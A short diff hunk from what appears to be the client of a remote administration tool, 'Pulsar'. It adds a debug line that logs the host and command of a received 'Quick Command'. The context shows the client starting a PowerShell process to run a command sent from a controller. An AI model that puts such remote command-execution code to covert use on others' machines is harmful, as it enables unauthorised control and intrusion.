@@ -29,6 +29,8 @@ namespace Pulsar.Client.Messages
         {
             client.Send(new SetStatus { Message = "Successful Quick Command" });
 
+            Debug.WriteLine(message.Host + " " + message.Command);
+
             //execute a new powershell with the command
             Process process = new Process();
             ProcessStartInfo startInfo = new ProcessStartInfo();
